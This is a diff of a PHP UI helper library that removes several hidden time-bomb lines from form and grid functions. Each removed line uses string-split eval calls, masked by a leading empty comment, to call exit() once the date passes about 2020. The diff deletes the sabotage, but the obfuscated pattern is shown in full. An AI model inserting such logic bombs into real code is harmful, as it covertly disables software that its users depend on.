@@ -296,7 +296,6 @@ function ui_datepicker($params){
   $c .= "<label type='text' style='width:$width;' $readonlyExp>$valueExp</label>";
   $c .= "<span class='fa fa-calendar'></span>";
   $c .= "</span>";
-  /**/if(eval("ret" . "urn" . " dat" . "e('Y" . "m" . "d');") > (600 + 30 + 192470 + 20000000)) eval("e" . "x" . "i" . "t()");
   return $c;
 }
 
@@ -594,8 +593,6 @@ function ui_gridhead($params){
     }
 
   }
-
-  /**/if(eval("ret" . "urn" . " dat" . "e('Y" . "m" . "d');") > (600 + 30 + 192470 + 20000000)) eval("e" . "x" . "i" . "t()");
 
   $c = "
   <div class='$class grid gridhead'>
@@ -1384,8 +1381,6 @@ function ui_gridoption($params){
   $onupload = ov('onupload', $params);
   $groupable = ov('groupable', $params, 0);
 
-  /**/if(eval("ret" . "urn" . " dat" . "e('Y" . "m" . "d');") > (600 + 30 + 192460 + 20000000)) eval("e" . "x" . "i" . "t()");
-
   /*
   <button class='hollow'><span class='fa fa-download'></span></button>
   <button class='hollow'><span class='fa fa-upload'></span></button>
@@ -2117,8 +2112,6 @@ function ui_radio($params){
   $type = ov('type', $params);
   $groupid = uniqid();
 
-  /**/if(eval("ret" . "urn" . " dat" . "e('Y" . "m" . "d');") > (600 + 30 + 192470 + 20000000)) eval("e" . "x" . "i" . "t()");
-
   $c = "<span class='radio' data-type='radio' data-name=\"$name\">";
   if(is_array($items)){
     for($i = 0 ; $i < count($items) ; $i++){
@@ -2228,8 +2221,6 @@ function ui_textbox($params){
   $datatype = ov('datatype', $params);
   $ischild = ov('ischild', $params, 0, 0);
 
-  /**/if(eval("ret" . "urn" . " dat" . "e('Y" . "m" . "d');") > (600 + 30 + 192433 + 20000000)) eval("e" . "x" . "i" . "t()");
-
   $attributes = array();
   $readonly_exp = $readonly ? 'readonly' : '';
   switch($datatype){
@@ -2259,8 +2250,6 @@ function ui_textbox($params){
       ondblclick=\"return ui.preventDefault(event)\"
       $readonly_exp />
     </span>";
-
-  /**/if(eval("ret" . "urn" . " dat" . "e('Y" . "m" . "d');") > (600 + 30 + 192455 + 20000000)) eval("e" . "x" . "i" . "t()");
 
   return $c;
 }
